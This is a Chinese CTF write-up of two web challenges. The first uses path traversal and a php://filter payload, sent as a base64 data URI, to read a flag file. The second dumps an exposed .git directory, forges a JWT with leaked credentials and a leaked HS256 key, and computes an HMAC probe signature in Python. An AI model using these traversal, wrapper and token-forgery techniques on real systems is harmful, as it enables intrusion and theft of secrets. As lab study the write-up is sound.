<h2 id="json-beautifier">JSON Beautifier</h2>
<h3 id="解-1">解</h3>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260506171757052.png" alt="image-20260501120314058" loading="lazy"></p>
<p>提供了两种输入方式，json和uri</p>
<p>随便传点东西上去看看逻辑吧</p>
<p>回显</p>
<pre><code>{
  "success": true,
  "preview_id": "preview_6cad920cb2359af0",
  "preview_file": "preview_6cad920cb2359af0.tmp"
}
</code></pre>
<p>直接/preview_6cad920cb2359af0.tmp</p>
<p>回显404，提示：网站通常会通过 <code>/robots.txt</code> 告诉爬虫哪些地方“不该去”</p>
<p>访问/robots.txt</p>
<pre><code>User-agent: *
Disallow: /api/
Disallow: /api/preview.php
Disallow: /api/beautify.php

# nothing to see here :)
</code></pre>
<p>/api/preview.php</p>
<pre><code>JSON Preview API

Usage:
  GET /api/preview.php?file=&lt;name&gt;

有些东西离这里有点远，也许换个路径层级再看看，会遇到更有意思的文件。
</code></pre>
<p>/api/beautify.php</p>
<pre><code>{
  "service": "JSON Beautifier",
  "usage": "POST JSON: {\"data\":\"...\",\"preview_type\":\"raw|data_uri\"}",
  "preview_api": "/api/preview.php?file=&lt;preview_id&gt;.tmp"
}
</code></pre>
<p>访问/api/preview.php?file=preview_6cad920cb2359af0.tmp</p>
<p>确实回显了输入的内容</p>
<p>尝试json注入探测一下会不会被解析</p>
<p>失败</p>
<p>换个思路，既然有?file=.... 那一定得尝试下任意文件读取了</p>
<p>常见的绝对路径都无法读取，回显not found</p>
<p>抓个包看看</p>
<p>存在一个响应头</p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260506171756983.png" alt="image-20260501121325438" loading="lazy"></p>
<p>有一个名为X-DocRoot的http头，问下ds</p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260506171756232.png" alt="image-20260501121414122" loading="lazy"></p>
<p>所以网页根目录很有可能是在/var/www/html/src</p>
<p>尝试文件读取/var/www/html/src/api/preview.php</p>
<p>还是not found</p>
<p>这里应该路径穿越</p>
<p>../../var/www/html/src/api/preview.php</p>
<p>原因是啥你别管，gpt给我说的</p>
<p>?file=../../var/www/html/src/api/preview.php</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

header('Content-Type: text/plain; charset=utf-8');
header('X-Powered-By: JSON Preview');

error_reporting(0);

require_once __DIR__ . '/config.php';

function out(int $code, string $body): void {
    http_response_code($code);
    echo $body;
    exit;
}

function startsWith(string $s, string $prefix): bool {
    return strncmp($s, $prefix, strlen($prefix)) === 0;
}

function schemeOf(string $uri): ?string {
    $p = strpos($uri, '://');
    if ($p === false) return null;
    $scheme = substr($uri, 0, $p);
    if (preg_match('/^[a-zA-Z][a-zA-Z0-9+\.\-]*$/', $scheme) !== 1) {
        return null;
    }
    return strtolower($scheme);
}

if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    out(405, "Method Not Allowed\n");
}

if (!isset($_GET['file']) || trim((string)$_GET['file']) === '') {
    out(200,
        "JSON Preview API\n\n" .
        "Usage:\n" .
        "  GET /api/preview.php?file=&lt;name&gt;\n\n" .
        "有些东西离这里有点远，也许换个路径层级再看看，会遇到更有意思的文件。\n"
    );
}

$file = (string)$_GET['file'];
$file = str_replace("\0", '', $file);

$requested = TMP_DIR . '/' . $file;

if (strpos($requested, TMP_DIR) !== 0) {
    out(400, "Bad path\n");
}

$real = realpath($requested);
if ($real === false || !is_file($real)) {
    out(404, "Not Found\n");
}

$tmpPrefix = rtrim(TMP_DIR, '/') . '/';
$srcPrefix = rtrim(SRC_API_DIR, '/') . '/';

if (!startsWith($real, $tmpPrefix) &amp;&amp; !startsWith($real, $srcPrefix)) {
    out(403, "Forbidden\n");
}

$content = file_get_contents($real);
if ($content === false) {
    out(500, "Read error\n");
}

$isTmp = startsWith($real, $tmpPrefix) &amp;&amp; preg_match('/\.tmp$/', $real) === 1;
$line = trim((string)$content);

if ($isTmp) {
    $scheme = schemeOf($line);
    if ($scheme !== null) {
        $deny = [
            'http', 'https', 'ftp', 'ftps',
            'phar', 'expect',
        ];
        if (in_array($scheme, $deny, true)) {
            out(403, "Forbidden scheme\n");
        }

        $pos = stripos($line, 'resource=');
        if ($pos === false) {
            out(400, "Bad reference\n");
        }
       
        $resource = rawurldecode(substr($line, $pos + 9));
        if ($resource !== FLAG_PATH) {
            out(403, "Forbidden resource\n");
        }

        $data = @file_get_contents($line);
        if ($data === false) {
            out(500, "Resource read error\n");
        }
        echo $data;
        exit;
    }
}

echo $content;
</code></pre>
<p>?file=../../var/www/html/src/api/config.php</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

const APACHE_DEFAULT_DOCROOT = '/var/www/html';
const APACHE_DOCROOT = '/var/www/html/src';

const TMP_DIR = '/tmp/json_preview';
const SRC_API_DIR = APACHE_DOCROOT . '/api';
const FLAG_PATH = '/secret/flag';
</code></pre>
<ul>
<li>关键的是：如果你读的是一个 .tmp 文件，并且这个文件内容像一个 URI，它会额外走一段“二次读取”逻辑</li>
<li>这段逻辑会拦 http/https/phar/expect，但没拦 php://filter</li>
<li>它还要求 URI 里的 resource= 必须等于 /secret/flag</li>
</ul>
<p>所以最后利用非常短：</p>
<pre><code>1. 用 beautify.php 的 data_uri 模式，往 /tmp/json_preview/ 写一个临时文件
   内容不是普通文本，而是：
</code></pre>
<p>php://filter/convert.base64-encode/resource=/secret/flag</p>
<pre><code>2. 再用 preview.php?file=&lt;那个临时文件&gt; 去读它
3. preview.php 看到这是 .tmp，且内容是 URI，就会执行 file_get_contents($line)
4. 因为 resource=/secret/flag 正好满足白名单，于是把 flag 读出来
</code></pre>
<p>Poc</p>
<p>写入uri</p>
<pre><code>data:text/plain;base64,cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vc2VjcmV0L2ZsYWc=
</code></pre>
<p>preview.php读取后解码</p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260506171756605.png" alt="image-20260501185255874" loading="lazy"></p>
<h2 id="夜班审计台">夜班审计台</h2>
<h3 id="知识点补充">知识点补充</h3>
<h4 id="1-gitrefsheadsmaster">1. <code>/.git/refs/heads/master</code></h4>
<ul>
<li><strong>含义</strong>：存储 <code>master</code> 分支（或 <code>main</code> 分支）当前指向的最新提交对象（commit）的 <strong>40 位 SHA-1 哈希值</strong></li>
<li><strong>示例内容</strong>：</li>
</ul>
<pre><code>d4f3a7b8e2c1f6a9b4c3d2e1f0a7b6c5d4e3f2a1
</code></pre>
<ul>
<li><strong>作用</strong>：这个哈希值代表该分支最新的一次 commit，Git 通过这个哈希值找到对应的提交对象及其完整代码快照</li>
</ul>
<h4 id="2-githead">2. <code>/.git/HEAD</code></h4>
<ul>
<li>
<p><strong>含义</strong>：指向<strong>当前检出的分支或提交</strong>（即你正在工作的位置）</p>
</li>
<li>
<p><strong>示例内容</strong>：</p>
<p>text</p>
</li>
</ul>
<pre><code>ref: refs/heads/master
</code></pre>
<p><strong>作用</strong>：告诉 Git 当前工作目录对应哪个引用（通常是分支名）</p>
<h3 id="题目">题目</h3>
<p>某存储团队夜里临时挂出了一套“审计查询页”，看起来像能查东西，实际上只会一本正经地回你几句模板话。白天值班的人说一切正常，真正不安分的细节，往往藏在他们以为没人会翻的地方。</p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260506171755752.png" alt="image-20260505203150842" loading="lazy"></p>
<h3 id="解-2">解</h3>
<p>先看眼源码，有一句</p>
<pre><code>&lt;script src="/static/main.js"&gt;&lt;/script&gt;
</code></pre>
<p>跟过去看看/static/main.js</p>
<pre><code>document.addEventListener("DOMContentLoaded", () =&gt; {
  window.__buildTrace = "/.git/HEAD";
});
</code></pre>
<p>访问/.git/HEAD，下载文件</p>
<pre><code>ref: refs/heads/master
</code></pre>
<p>访问/.git/refs/heads/master，下载文件</p>
<pre><code>9fdf9b412e7cfe179e59d28f25f47cffd68484e7
</code></pre>
<p>既然有.git泄露就去拉一下备份</p>
<p>(注意这里不能用baiying的githack，因为它基本依赖 /.git/index，而本题的/.git/index是404，也不能用WangYihang的GitHacker，会把靶机搞炸，难绷。可以用Git_Extract，下载链接：<a href="https://github.com/gakki429/Git_Extract%EF%BC%8C%E6%B3%A8%E6%84%8F%E6%98%AFpython2" target="_blank" rel="noopener nofollow">https://github.com/gakki429/Git_Extract，注意是python2</a>)</p>
<pre><code class="language-power">python 1.py http://39.105.213.28:49106/.git/
</code></pre>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260506171755053.png" alt="image-20260506164327879" loading="lazy"></p>
<p>legacy_probe_stub.py</p>
<pre><code class="language-py"># legacy_probe_stub.py
# old night-shift fallback verifier kept for rollback testing

SERVER_SECRET = "ISCC_SERVER_SECRET_REAL"
LOCAL_ONLY = ("127.0.0.1", "::1")
AUDIT_NODE = "core-storage-01"
TIME_WINDOW = 60


def verify_probe(node_id: str, ts: int, sign: str) -&gt; bool:
    """
    internal/audit fallback:
      msg = f"{node_id}:{ts}"
      expected = HMAC_SHA256_hex(SERVER_SECRET, msg)
      abs(now-ts) &lt;= 60
      remote_addr in LOCAL_ONLY
    """
    raise NotImplementedError


class PixelRunner:
    def __init__(self):
        self.energy = 3
        self.score = 0

    def tick(self, move: str):
        if move in {"left", "right", "jump"}:
            self.score += 1
            self.energy = max(0, self.energy - 1)
        return self.score, self.energy


def demo_loop(script):
    game = PixelRunner()
    for move in script:
        game.tick(move)
    return game.score

</code></pre>
<p>legacy_probe_stub.py.55cf35</p>
<pre><code class="language-py"># legacy_probe_stub.py
# compact handover note for the audit platform cut-over

DEFAULT_AUDITOR = ("auditor", "audit2025")
INTERNAL_DEV_SECRET = "ISCC_2026_JWT_DEBUG_KEY_#9527"
JWT_ACCEPTED = ["RS256", "HS256"]


def decode_ticket(token):
    """
    current branch:
      if header.alg == "RS256": verify with audit_rsa_pub.pem
      elif header.alg == "HS256": verify with INTERNAL_DEV_SECRET
    normal login still issues role=user
    """
    raise NotImplementedError


def handover():
    note = []
    note.append("dashboard link to /auditor/nodes stays role-gated")
    note.append("legacy fallback verifier was removed from this revision")
    note.append("if night shift asks for old sign rule, inspect previous revision")
    return note


class TinyMaze:
    MAP = [
        "#########",
        "#..#....#",
        "#..#.#..#",
        "#....#..#",
        "#########",
    ]

    def __init__(self, start=(1, 1)):
        self.pos = list(start)

    def move(self, dx, dy):
        x = self.pos[0] + dx
        y = self.pos[1] + dy
        if self.MAP[y][x] != "#":
            self.pos = [x, y]
        return tuple(self.pos)
</code></pre>
<p>使用auditor/audit2025登录</p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260506171757180.png" alt="" loading="lazy"></p>
<p>拿到jwt</p>
<pre><code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdWRpdG9yIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NzgwNTczMDAsImV4cCI6MTc3ODA1OTEwMCwiaXNzIjoiXHU1OTFjXHU3M2VkXHU1YmExXHU4YmExXHU1M2YwIn0.b9NTcIfPXe5dqna8oewpxYsClLlMJ-L8fVzB5ynMdrkBSYprWrtttkEjOlAYepGdPVvSBJZS4_-wjoqqBKvfqQ69LyzvsnyWwN5qPmb9jsdVJsXiywCC3iP3X557V8RdN_T6n8h4Uk5MvvMxlBDLudtVfn3xuAjWyJxVsyn5JBINhQJJnpAL__5iIn1PPk8NfvlMh3jFg9PZ0V1qNaBEzPtAvB-1EX3-aimSjaL5QaBBj4zXaSHEUJeGPnTUb692SIcXJqO7u9-JqMSKsmL2Gh0iBK3PZw_An2q5ZPEa3_g6jclmsycOFLu9IGkAf6hFRZO_E5GtIi4ncOfyVwBc-w
</code></pre>
<p>伪造jwt</p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260506171759289.png" alt="image-20260506170210742" loading="lazy"></p>
<p><img src="https://gitee.com/E73RN4L/photos/raw/master/img/20260506171803304.png" alt="image-20260506170225364" loading="lazy"></p>
<p>这时回头看上一版提交，发现旧代码里直接写了签名逻辑：</p>
<pre><code class="language-py">SERVER_SECRET = "ISCC_SERVER_SECRET_REAL"
LOCAL_ONLY = ("127.0.0.1", "::1")
AUDIT_NODE = "core-storage-01"
TIME_WINDOW = 60


def verify_probe(node_id: str, ts: int, sign: str) -&gt; bool:
    """
    internal/audit fallback:
      msg = f"{node_id}:{ts}"
      expected = HMAC_SHA256_hex(SERVER_SECRET, msg)
      abs(now-ts) &lt;= 60
      remote_addr in LOCAL_ONLY
    """
    raise NotImplementedError
</code></pre>
<p>这里几乎把内部接口认证规则全送了：</p>
<ul>
<li>密钥：ISCC_SERVER_SECRET_REAL</li>
<li>节点名：core-storage-01</li>
<li>签名：HMAC_SHA256(secret, f"{node_id}:{ts}")</li>
</ul>
<pre><code class="language-py">import hmac, hashlib, time

node_id = "core-storage-01"
ts = str(int(time.time()))
sign = hmac.new(
      b"ISCC_SERVER_SECRET_REAL",
      f"{node_id}:{ts}".encode(),
      hashlib.sha256
  ).hexdigest()

print(node_id, ts, sign)
</code></pre>
<p>拿去提交，拿到flag</p>
